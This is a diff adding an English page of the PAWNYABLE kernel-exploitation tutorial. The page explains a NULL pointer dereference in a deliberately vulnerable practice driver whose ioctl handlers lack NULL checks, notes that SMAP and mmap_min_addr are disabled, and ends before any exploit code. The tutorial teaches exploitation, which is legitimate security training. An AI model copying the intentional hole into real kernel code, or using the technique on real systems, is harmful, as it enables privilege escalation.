@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta name="og:url" content="https://pawnyable.cafe//en/linux-kernel/LK02/null_ptr_deref.html">
+
+    <meta name="og:title" content="NULL Pointer Dereference - PAWNYABLE!">
+
+<meta name="og:image" content="https://pawnyable.cafe/pawnyable.ogp.png">
+<meta name="og:description" content="もふもふpwnワールド">
+<meta name="og:type" content="website">
+<meta name="og:site_name" content="PAWNYABLE!">
+
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="ptr-yudai">
+
+
+    <meta name="subtitle" content="pawnyable">
+
+
+    <meta name="description" content="Let's learn pwnable with cute animals.">
+
+
+    <meta name="keywords" content="linux,windows,kernel,browser,vm,exploit,exploitation,binary exploit,pwn,pwnable">
+
+
+
+
+<title>NULL Pointer Dereference | PAWNYABLE!</title>
+
+
+
+    <link rel="icon" href="/favicon.png">
+
+
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
+</style>
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/frame.js"></script>
+    
+
+
+
+
+
+
+
+  <style type="text/css">
+.spoiler {
+  display: inline;
+}
+p.spoiler {
+  display: flex;
+}
+.spoiler a {
+  pointer-events: none;
+}
+.spoiler-blur, .spoiler-blur > * {
+  transition: text-shadow .5s ease;
+}
+.spoiler .spoiler-blur, .spoiler .spoiler-blur > * {
+  color: rgba(0, 0, 0, 0);
+  background-color: rgba(0, 0, 0, 0);
+  text-shadow: 0 0 10px grey;
+  cursor: pointer;
+}
+.spoiler .spoiler-blur:hover, .spoiler .spoiler-blur:hover > * {
+  text-shadow: 0 0 5px grey;
+}
+.spoiler-box, .spoiler-box > * {
+  transition: color .5s ease,
+  background-color .5s ease;
+}
+.spoiler .spoiler-box, .spoiler .spoiler-box > * {
+  color: black;
+  background-color: black;
+  text-shadow: none;
+}</style><meta name="generator" content="Hexo 5.4.2"></head>
+  <body>
+    <div class="mask-border">
+    </div>
+
+    <div class="wrapper">
+
+      
+<div class="header">
+  <div class="flex-container">
+    <div class="header-inner">
+      <div class="site-brand-container">
+        <a href="/en/">PAWNYABLE</a>
+      </div>
+      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
+        Menu
+      </div>
+      <nav class="site-nav">
+        <ul class="menu-list">
+          
+            
+              <li class="menu-item">
+                <a href="/en/practice/">Practice</a>
+              </li> 
+                   
+          
+            
+              <li class="menu-item">
+                <a href="/en/about/">About</a>
+              </li> 
+                   
+          
+        </ul>
+      </nav>
+      
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK02/null_ptr_deref">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK02/null_ptr_deref">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK02/null_ptr_deref">KR</a>
+    
+  
+</div>
+
+    </div>
+  </div>
+</div>
+
+
+      <div class="main">
+        <div class="flex-container">
+          <article id="post">
+
+  
+    
+<div class="post-head">
+    <div class="post-info">
+        <div class="post-title">
+            
+                NULL Pointer Dereference
+                        
+        </div>
+    </div>
+    <div class="h-line-primary"></div>
+    
+<div class="language-switcher">
+  
+    
+      <a class="language-link" href="/linux-kernel/LK02/null_ptr_deref">JA</a>
+    
+  
+    
+      <a class="language-link language-link-active" href="/en/linux-kernel/LK02/null_ptr_deref">EN</a>
+    
+  
+    
+      <a class="language-link" href="/kr/linux-kernel/LK02/null_ptr_deref">KR</a>
+    
+  
+</div>
+
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK01/race_condition.html">Previous</a></div>
+            <div class="pagination-index"><a href="../index.html">Contents</a></div>
+            <div class="pagination-fd"><a href="../LK03/double_fetch.html">Next</a></div>
+        </div>
+    
+    
+        <div class="column" title="Table of Contents">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#About-the-vulnerability-in-this-chapter"><span class="toc-text">About the vulnerability in this chapter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Confirming-the-vulnerability"><span class="toc-text">Confirming the vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ioctl"><span class="toc-text">ioctl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#struct-file"><span class="toc-text">struct file</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview-of-the-program"><span class="toc-text">Overview of the program</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Investigating-the-bug"><span class="toc-text">Investigating the bug</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Confirming-the-bug"><span class="toc-text">Confirming the bug</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Virtual-memory-and-mmap-min-addr"><span class="toc-text">Virtual memory and mmap_min_addr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-escalation"><span class="toc-text">Privilege escalation</span></a></li></ol>
+        </div>
+    
+</div>
+
+    <div class="post-content">
+    <p>Most of the core knowledge required for kernel exploitation was already covered in LK01. From here on, we focus on techniques specific to kernel space and attacks against Linux kernel features.<br>
+In LK02 (Angus), we learn how to exploit a NULL pointer dereference in kernel space. First download <a href="distfiles/LK02.tar.gz">the LK02 practice files</a>.</p>
+<h2 id="About-the-vulnerability-in-this-chapter">About the vulnerability in this chapter</h2>
+<p>If you inspect the QEMU startup options for LK02, you will notice that SMAP is disabled on the target machine. The NULL pointer dereference in this chapter is not exploitable unless SMAP is disabled.</p>
+<p>Also, boot the challenge kernel and run:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /proc/sys/vm/mmap_min_addr</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.17.1/source/security/min_addr.c#L8"><code>mmap_min_addr</code></a> is a Linux kernel variable that limits the lowest address that userland may map with <code>mmap</code>. Normally it is nonzero, but in this challenge it is set to <code>0</code>. This mitigation was introduced in Linux 2.6.23 specifically to make NULL pointer dereference bugs harder to exploit.</p>
+<p>So the attack in this chapter assumes that mitigations such as SMAP and low-address mapping restrictions can be bypassed or are disabled. If you only care about techniques that still apply directly on modern default Linux systems, you may skip this chapter.</p>
+<h2 id="Confirming-the-vulnerability">Confirming the vulnerability</h2>
+<p>Let’s begin by reading the LK02 source code in <code>src/angus.c</code>.</p>
+<h3 id="ioctl"><code>ioctl</code></h3>
+<p>The biggest difference from LK01 is that this driver does not implement <code>read</code> or <code>write</code>. Instead, it uses an <code>ioctl</code> handler.<br>
+Calling <code>ioctl</code> on the file descriptor causes the matching kernel or driver-side handler to run.<br>
+<code>ioctl</code> takes two additional arguments besides the file descriptor:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ioctl(fd, request, argp);</span><br></pre></td></tr></table></figure>
+<p><code>request</code> is a request code defined by the device driver. You have to read the source to see which requests the device supports.<br>
+<code>argp</code> usually points to userland data, which the kernel module reads with <code>copy_from_user</code>.</p>
+<p>This module expects a structure called <code>request_t</code> from userland:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *ptr;</span><br><span class="line">  <span class="type">size_t</span> len;</span><br><span class="line">&#125; <span class="type">request_t</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">module_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params">                         <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req;</span><br><span class="line">  XorCipher *ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(&amp;req, (<span class="type">void</span>*)arg, <span class="keyword">sizeof</span>(<span class="type">request_t</span>)))</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
+<p>It also changes behavior depending on the request code:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">  <span class="keyword">case</span> CMD_INIT:</span><br><span class="line">    <span class="keyword">if</span> (!ctx)</span><br><span class="line">      filp-&gt;private_data = (<span class="type">void</span>*)kzalloc(<span class="keyword">sizeof</span>(XorCipher), GFP_KERNEL);</span><br><span class="line">    <span class="keyword">if</span> (!filp-&gt;private_data) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> CMD_SETKEY:</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">case</span> CMD_SETDATA:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
+<p>Before reading the <code>ioctl</code> logic in detail, we need to understand <code>private_data</code>.</p>
+<h3 id="struct-file"><code>struct file</code></h3>
+<p>Userland refers to drivers through file descriptors, but inside the kernel this becomes a <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.17.1/source/include/linux/fs.h#L956"><code>struct file</code></a>.<br>
+That structure contains file-specific state such as the current offset, but one field is explicitly available for driver-private use:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="type">void</span>			*private_data;</span><br></pre></td></tr></table></figure>
+<p>Drivers may store whatever they want there, but they are responsible for allocating and freeing it correctly.<br>
+This driver stores a custom structure called <code>XorCipher</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">  filp-&gt;private_data = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">module_close</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *filp)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (filp-&gt;private_data)</span><br><span class="line">    kfree(filp-&gt;private_data);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">  <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> CMD_INIT:</span><br><span class="line">      <span class="keyword">if</span> (!ctx)</span><br><span class="line">        filp-&gt;private_data = (<span class="type">void</span>*)kzalloc(<span class="keyword">sizeof</span>(XorCipher), GFP_KERNEL);</span><br><span class="line">      <span class="keyword">if</span> (!filp-&gt;private_data) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_atamawaru.png" alt="Wolf" ></div>
+  <p class="says">
+    If Holstein v4 had stored per-open data in `private_data`, its race would have been much harder to trigger.
+  </p>
+</div>
+<h3 id="Overview-of-the-program">Overview of the program</h3>
+<p>This driver encrypts and decrypts data with an XOR cipher.<br>
+It is controlled through <code>ioctl</code>, and it exposes the following six request codes:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_INIT    0x13370001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_SETKEY  0x13370002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_SETDATA 0x13370003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_GETDATA 0x13370004</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_ENCRYPT 0x13370005</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CMD_DECRYPT 0x13370006</span></span><br></pre></td></tr></table></figure>
+<p><code>CMD_INIT</code> allocates an <code>XorCipher</code> object in <code>private_data</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *key;</span><br><span class="line">  <span class="type">char</span> *data;</span><br><span class="line">  <span class="type">size_t</span> keylen;</span><br><span class="line">  <span class="type">size_t</span> datalen;</span><br><span class="line">&#125; XorCipher;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">case</span> CMD_INIT:</span><br><span class="line">      <span class="keyword">if</span> (!ctx)</span><br><span class="line">        filp-&gt;private_data = (<span class="type">void</span>*)kzalloc(<span class="keyword">sizeof</span>(XorCipher), GFP_KERNEL);</span><br><span class="line">      <span class="keyword">if</span> (!filp-&gt;private_data) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">      <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>The structure stores a key and its length, and data plus its length.</p>
+<p><code>CMD_SETKEY</code> copies the user-supplied key into kernel memory. If a key is already present, it frees the old one first.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CMD_SETKEY:</span><br><span class="line">  <span class="keyword">if</span> (!ctx) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (!req.ptr || req.len &gt; <span class="number">0x1000</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;key) kfree(ctx-&gt;key);</span><br><span class="line">  <span class="keyword">if</span> (!(ctx-&gt;key = (<span class="type">char</span>*)kmalloc(req.len, GFP_KERNEL))) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(ctx-&gt;key, req.ptr, req.len)) &#123;</span><br><span class="line">    kfree(ctx-&gt;key);</span><br><span class="line">    ctx-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ctx-&gt;keylen = req.len;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>Similarly, <code>CMD_SETDATA</code> copies plaintext or ciphertext data from userland:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CMD_SETDATA:</span><br><span class="line">  <span class="keyword">if</span> (!ctx) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (!req.ptr || req.len &gt; <span class="number">0x1000</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;data) kfree(ctx-&gt;data);</span><br><span class="line">  <span class="keyword">if</span> (!(ctx-&gt;data = (<span class="type">char</span>*)kmalloc(req.len, GFP_KERNEL))) <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (copy_from_user(ctx-&gt;data, req.ptr, req.len)) &#123;</span><br><span class="line">    kfree(ctx-&gt;key);</span><br><span class="line">    ctx-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ctx-&gt;datalen = req.len;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>The encrypted or decrypted data can be copied back to userland with <code>CMD_GETDATA</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> CMD_GETDATA:</span><br><span class="line">  <span class="keyword">if</span> (!ctx-&gt;data) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (!req.ptr || req.len &gt; ctx-&gt;datalen) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">if</span> (copy_to_user(req.ptr, ctx-&gt;data, req.len)) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
+<p>Finally, <code>CMD_ENCRYPT</code> and <code>CMD_DECRYPT</code> call the same XOR routine:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">xor</span><span class="params">(XorCipher *ctx)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!ctx-&gt;data || !ctx-&gt;key) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ctx-&gt;datalen; i++)</span><br><span class="line">    ctx-&gt;data[i] ^= ctx-&gt;key[i % ctx-&gt;keylen];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CMD_ENCRYPT:</span><br><span class="line">    <span class="keyword">case</span> CMD_DECRYPT:</span><br><span class="line">      <span class="keyword">return</span> xor(ctx);</span><br></pre></td></tr></table></figure>
+<h3 id="Investigating-the-bug">Investigating the bug</h3>
+<p>At first glance, the driver has no obvious buffer overflow or use-after-free.<br>
+The subtle bug is a NULL pointer dereference in the encryption/decryption path.</p>
+<p>At the beginning of <code>ioctl</code>, the module loads <code>private_data</code> into an <code>XorCipher *</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx = (XorCipher*)filp-&gt;private_data;</span><br></pre></td></tr></table></figure>
+<p>For <code>CMD_SETKEY</code> and similar requests, it checks that <code>private_data</code> has been initialized:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!ctx) <span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure>
+<p>But those checks are missing for <code>CMD_GETDATA</code>, <code>CMD_ENCRYPT</code>, and <code>CMD_DECRYPT</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">xor</span><span class="params">(XorCipher *ctx)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!ctx-&gt;data || !ctx-&gt;key) <span class="keyword">return</span> -EINVAL; <span class="comment">// no NULL check for ctx</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ctx-&gt;datalen; i++)</span><br><span class="line">    ctx-&gt;data[i] ^= ctx-&gt;key[i % ctx-&gt;keylen];</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">case</span> CMD_GETDATA:</span><br><span class="line">      <span class="keyword">if</span> (!ctx-&gt;data) <span class="keyword">return</span> -EINVAL; <span class="comment">// no NULL check for ctx</span></span><br><span class="line">      <span class="keyword">if</span> (!req.ptr || req.len &gt; ctx-&gt;datalen) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">      <span class="keyword">if</span> (copy_to_user(req.ptr, ctx-&gt;data, req.len)) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> CMD_ENCRYPT:</span><br><span class="line">    <span class="keyword">case</span> CMD_DECRYPT:</span><br><span class="line">      <span class="keyword">return</span> xor(ctx);</span><br></pre></td></tr></table></figure>
+<p>So if we reach those paths without initializing <code>private_data</code>, the driver dereferences an uninitialized <code>XorCipher</code>, which is in practice a <code>NULL</code> pointer.</p>
+<h3 id="Confirming-the-bug">Confirming the bug</h3>
+<p>First, let’s exercise the driver normally. It is convenient to wrap each request code in a helper function:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">angus_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_INIT, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_setkey</span><span class="params">(<span class="type">char</span> *key, <span class="type">size_t</span> keylen)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .ptr = key, .len = keylen &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SETKEY, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_setdata</span><span class="params">(<span class="type">char</span> *data, <span class="type">size_t</span> datalen)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .ptr = data, .len = datalen &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_SETDATA, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_getdata</span><span class="params">(<span class="type">char</span> *data, <span class="type">size_t</span> datalen)</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; .ptr = data, .len = datalen &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_GETDATA, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_encrypt</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_ENCRYPT, &amp;req);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">angus_decrypt</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">request_t</span> req = &#123; <span class="literal">NULL</span> &#125;;</span><br><span class="line">  <span class="keyword">return</span> ioctl(fd, CMD_ENCRYPT, &amp;req);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>For example, let’s encrypt and decrypt <code>&quot;Hello, World!&quot;</code> with the key <code>&quot;ABC123&quot;</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/angus&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/angus&quot;</span>);</span><br><span class="line"></span><br><span class="line">  angus_init();</span><br><span class="line">  angus_setkey(<span class="string">&quot;ABC123&quot;</span>, <span class="number">6</span>);</span><br><span class="line">  angus_setdata(<span class="string">&quot;Hello, World!&quot;</span>, <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">  angus_encrypt();</span><br><span class="line">  angus_getdata(buf, <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buf[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  angus_decrypt();</span><br><span class="line">  angus_getdata(buf, <span class="number">13</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x &quot;</span>, buf[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>If encryption and decryption work, the driver is behaving normally.</p>
+<center>
+  <img src="img/angus_usage.png" alt="Normal use of the Angus module" style="width:320px;">
+</center>
+<p>Now try encrypting without initializing <code>XorCipher</code>:</p>
